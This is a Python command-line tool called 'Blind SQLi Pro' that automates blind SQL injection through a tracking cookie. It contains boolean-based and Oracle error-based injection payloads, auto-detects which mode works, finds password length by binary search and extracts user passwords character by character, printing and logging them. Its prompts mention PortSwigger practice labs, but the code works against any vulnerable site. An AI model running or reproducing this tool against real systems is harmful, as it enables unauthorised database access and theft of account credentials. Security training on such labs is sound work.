#!/usr/bin/env python3
import sys
import string
import argparse
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from urllib3.exceptions import InsecureRequestWarning
from colorama import init, Fore, Style, just_fix_windows_console

just_fix_windows_console()
init(autoreset=True)

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-GB,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

def setup_logger(log_file):
    logger = logging.getLogger("BlindSQLiPro")
    logger.setLevel(logging.DEBUG)

    fh = logging.FileHandler(log_file, mode='w', encoding='utf-8')
    fh.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    fh.setFormatter(formatter)

    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(logging.INFO)
    ch.setFormatter(logging.Formatter('%(message)s'))

    if not logger.handlers:
        logger.addHandler(fh)
        logger.addHandler(ch)
    return logger

def banner():
    print(f"""
{Fore.CYAN}
    ====================================================================
                B L I N D   S Q L I   P R O   (CLI)
    ====================================================================
    [+] Creator   : M Haidar
    [+] LinkedIn  : https://www.linkedin.com/in/haidarobs
    [+] GitHub    : https://github.com/mdhaidarobs
    [+] Version   : 3.7 (Header + Mode Force + Session Fix)
    ====================================================================
{Style.RESET_ALL}
    """)

def log_info(msg, color=Fore.GREEN):
    print(f"{color}[+]{Style.RESET_ALL} {msg}")

def log_warn(msg, color=Fore.YELLOW):
    print(f"{color}[!]{Style.RESET_ALL} {msg}")

def log_error(msg, color=Fore.RED):
    print(f"{color}[-]{Style.RESET_ALL} {msg}")

def get_user_input_interactive():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", default=None)
    parser.add_argument("-t", "--tracking", default="182--")
    parser.add_argument("-c", "--cookie", default="TrackingId")
    parser.add_argument("-sc", "--session", default=None)
    parser.add_argument("-m", "--mode", type=int, default=None)
    parser.add_argument("-usr", "--users", default="administrator")
    parser.add_argument("-l", "--length", type=int, default=None)
    parser.add_argument("-p", "--proxy", default=None)
    parser.add_argument("-w", "--workers", type=int, default=1)
    parser.add_argument("-T", "--timeout", type=int, default=15)
    parser.add_argument("-s", "--special", action="store_true")
    parser.add_argument("-o", "--log", default=f"sqli_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

    args = parser.parse_args([])

    print(f"\n{Fore.YELLOW}[*] Interactive Mode Enabled. Provide configuration details below:{Style.RESET_ALL}\n")

    while True:
        url = input(f"{Fore.CYAN}Enter Target Lab URL (e.g., https://example.com/filter?category=Gifts): {Style.RESET_ALL}").strip()
        if url.startswith("http"):
            args.url = url
            break
        log_error("URL must start with http:// or https://. Try again.")

    while True:
        tracking_id = input(f"{Fore.CYAN}Enter your Base Tracking ID value: {Style.RESET_ALL}").strip()
        if tracking_id:
            args.tracking = tracking_id
            break
        log_error("Tracking ID cannot be empty. Try again.")

    cookie_name = input(f"{Fore.CYAN}Enter Cookie Name vulnerable to SQLi [Default: TrackingId]: {Style.RESET_ALL}").strip()
    if cookie_name:
        args.cookie = cookie_name

    session_cookie = input(f"{Fore.CYAN}Enter Session Cookie value: {Style.RESET_ALL}").strip()
    if session_cookie:
        args.session = session_cookie

    mode_input = input(f"{Fore.CYAN}Enter Injection Mode (1 for Boolean, 2 for Error-based) or leave blank for auto: {Style.RESET_ALL}").strip()
    if mode_input:
        try:
            args.mode = int(mode_input)
            if args.mode not in (1, 2):
                args.mode = None
                log_warn("Invalid mode. Auto-detection will be used.")
        except ValueError:
            log_warn("Invalid mode. Auto-detection will be used.")

    users_input = input(f"{Fore.CYAN}Enter Username(s) to target (comma separated) [Default: administrator]: {Style.RESET_ALL}").strip()
    if users_input:
        args.users = users_input

    length_input = input(f"{Fore.CYAN}Enter expected password length (e.g., 20) or leave blank for auto-detect: {Style.RESET_ALL}").strip()
    if length_input:
        try:
            args.length = int(length_input)
            if args.length <= 0:
                raise ValueError
        except ValueError:
            log_warn("Invalid length provided. Auto-detection will be used.")

    use_proxy = input(f"{Fore.CYAN}Do you want to route traffic through Burp Suite proxy (127.0.0.1:8080)? (y/N): {Style.RESET_ALL}").strip().lower()
    if use_proxy == 'y':
        args.proxy = "http://127.0.0.1:8080"
        log_info("Proxy enabled: Traffic will route through Burp Suite.")

    workers_input = input(f"{Fore.CYAN}Enter number of workers [Default: 1, use 1 for PortSwigger]: {Style.RESET_ALL}").strip()
    if workers_input:
        try:
            args.workers = int(workers_input)
            if args.workers < 1:
                args.workers = 1
        except ValueError:
            pass

    use_special = input(f"{Fore.CYAN}Include special characters in charset? (y/N): {Style.RESET_ALL}").strip().lower()
    if use_special == 'y':
        args.special = True

    return args

class BlindSQLiEngine:
    def __init__(self, args):
        self.url = args.url
        self.base_id = args.tracking
        self.cookie_name = args.cookie
        self.session_cookie = args.session
        self.active_mode = args.mode
        self.target_users = [u.strip() for u in args.users.split(',') if u.strip()]
        self.max_length = args.length
        self.use_special = args.special
        self.workers = max(1, args.workers)
        self.timeout = args.timeout
        self.log_file = args.log
        self.logger = setup_logger(self.log_file)
        self.headers = dict(DEFAULT_HEADERS)

        self.proxies = None
        if args.proxy:
            self.proxies = {
                'http': args.proxy,
                'https': args.proxy
            }

        self.charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
        if self.use_special:
            self.charset += "!@#$%^&*()-_=+[]{}|;:,.<>?/\\~`"

        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(max_retries=3)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def _build_payload_mode1(self, user, position, char):
        if char is None:
            return f"{self.base_id}' and (select username from users where username='{user}' and LENGTH(password)>1)='{user}'--"
        return f"{self.base_id}' and (select substring(password,{position},1) from users where username='{user}')='{char}'--"

    def _build_length_payload_mode1(self, user, mid):
        return f"{self.base_id}' and (select username from users where username='{user}' and LENGTH(password)>={mid})='{user}'--"

    def _build_payload_mode2(self, user, position, char):
        if char is None:
            return f"{self.base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='{user}' and LENGTH(password)>1) || '"
        return f"{self.base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='{user}' and substring(password,{position},1)='{char}') || '"

    def _build_length_payload_mode2(self, user, mid):
        return f"{self.base_id}' || (select CASE WHEN (length(password) >= {mid}) THEN TO_CHAR(1/0) ELSE '' END from users where username='{user}') || '"

    def _send_request(self, payload, mode):
        cookies = {self.cookie_name: payload}
        if self.session_cookie:
            cookies["session"] = self.session_cookie

        try:
            response = self.session.get(
                self.url,
                cookies=cookies,
                headers=self.headers,
                proxies=self.proxies,
                verify=False,
                timeout=self.timeout,
                allow_redirects=False
            )

            if mode == 1:
                return "Welcome back" in response.text
            elif mode == 2:
                return response.status_code == 500 or "Internal Server Error" in response.text
            return False
        except Exception as e:
            self.logger.debug(f"Request failed: {e}")
            return False

    def _detect_mode(self, user):
        log_info("Auto-detecting injection payload type (Testing Mode 2 - Oracle Error)...")

        test_true = f"{self.base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '"
        try:
            cookies = {self.cookie_name: test_true}
            if self.session_cookie:
                cookies["session"] = self.session_cookie
            r = self.session.get(
                self.url, cookies=cookies, headers=self.headers,
                proxies=self.proxies, verify=False, timeout=self.timeout,
                allow_redirects=False
            )
            if r.status_code == 500 or "Internal Server Error" in r.text:
                log_info("Successfully detected Mode 2 (Oracle Error/Case-Based)")
                return 2
        except Exception as e:
            self.logger.debug(f"Mode 2 detection failed: {e}")

        log_info("Mode 2 failed. Trying Mode 1 (Boolean)...")
        test_payload_1 = self._build_payload_mode1(user, 1, None)
        if self._send_request(test_payload_1, mode=1):
            log_info("Successfully detected Mode 1 (Standard Boolean-Based)")
            return 1

        log_warn("Could not auto-detect mode definitively. Defaulting to Mode 2.")
        return 2

    def _detect_length(self, user):
        log_info(f"Detecting password length for '{user}'...")

        if not self.active_mode:
            self.active_mode = self._detect_mode(user)

        max_possible = 128
        low, high = 1, max_possible
        length = -1

        while low <= high:
            mid = (low + high) // 2
            if self.active_mode == 1:
                payload = self._build_length_payload_mode1(user, mid)
            else:
                payload = self._build_length_payload_mode2(user, mid)

            if self._send_request(payload, self.active_mode):
                length = mid
                low = mid + 1
            else:
                high = mid - 1

        if length == -1:
            log_error("Could not determine length. User might not exist or no password.")
            return None

        log_info(f"Password length detected: {length}")
        return length

    def _extract_char(self, user, position):
        found_char = None

        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            future_to_char = {}
            for char in self.charset:
                if self.active_mode == 1:
                    p = self._build_payload_mode1(user, position, char)
                else:
                    p = self._build_payload_mode2(user, position, char)
                fut = executor.submit(self._send_request, p, self.active_mode)
                future_to_char[fut] = char

            for future in as_completed(future_to_char):
                char = future_to_char[future]
                try:
                    if future.result():
                        found_char = char
                        for f in future_to_char:
                            if not f.done():
                                f.cancel()
                        break
                except Exception as e:
                    self.logger.debug(f"Future error: {e}")

        return found_char

    def extract_password(self, user):
        log_info(f"Starting extraction for user: {Fore.CYAN}{user}{Style.RESET_ALL}")

        if not self.active_mode:
            self.active_mode = self._detect_mode(user)

        if self.max_length:
            length = self.max_length
            log_info(f"Using provided length: {length}")
        else:
            length = self._detect_length(user)
            if not length:
                return None

        password = ""

        for pos in range(1, length + 1):
            sys.stdout.write(f"\r[+] {user} | Pos {pos}/{length} | Current: {Fore.YELLOW}{password}{Style.RESET_ALL} ")
            sys.stdout.flush()

            char = self._extract_char(user, pos)

            if char:
                password += char
                self.logger.info(f"Position {pos}: Found '{char}'")
            else:
                log_warn(f"Character not found at position {pos}. Stopping extraction for {user}.")
                break

        sys.stdout.write("\n")
        return password

    def run(self):
        results = {}

        for user in self.target_users:
            log_info(f"{'='*20} Target: {user} {'='*20}")
            password = self.extract_password(user)
            if password:
                results[user] = password
                log_info(f"Success! Password for {Fore.CYAN}{user}{Style.RESET_ALL} is: {Fore.GREEN}{password}{Style.RESET_ALL}")
            else:
                log_error(f"Failed to extract password for {user}.")

        print(f"\n{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA} FINAL RESULTS {Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        for user, pwd in results.items():
            print(f"{Fore.CYAN}{user:15} {Style.RESET_ALL} : {Fore.GREEN}{pwd}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        print(f"\n[+] Results logged to: {self.log_file}")

def main():
    banner()
    if len(sys.argv) == 1:
        args = get_user_input_interactive()
    else:
        parser = argparse.ArgumentParser(
            description="Blind SQLi Pro - Smart Auto-Fallback Automation Tool",
            formatter_class=argparse.RawDescriptionHelpFormatter
        )

        parser.add_argument("-u", "--url", required=True, help="Target URL")
        parser.add_argument("-t", "--tracking", default="182--", help="Base Tracking ID")
        parser.add_argument("-c", "--cookie", default="TrackingId", help="Cookie name")
        parser.add_argument("-sc", "--session", default=None, help="Session cookie value")
        parser.add_argument("-m", "--mode", type=int, default=None, choices=[1, 2], help="Injection mode (1 or 2)")
        parser.add_argument("-usr", "--users", default="administrator", help="Usernames")
        parser.add_argument("-l", "--length", type=int, default=None, help="Password length")
        parser.add_argument("-p", "--proxy", help="Proxy URL")
        parser.add_argument("-w", "--workers", type=int, default=1, help="Workers (use 1 for PortSwigger)")
        parser.add_argument("-T", "--timeout", type=int, default=15, help="Timeout")
        parser.add_argument("-s", "--special", action="store_true", help="Special chars")
        parser.add_argument("-o", "--log", default=f"sqli_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log", help="Log file")

        args = parser.parse_args()

    if not args.url.startswith(('http://', 'https://')):
        log_error("URL must start with http:// or https://")
        sys.exit(1)

    if args.workers < 1:
        args.workers = 1

    engine = BlindSQLiEngine(args)

    try:
        engine.run()
    except KeyboardInterrupt:
        log_warn("\n[!] Interrupted by user. Saving partial results...")
        sys.exit(0)

if __name__ == "__main__":
    main()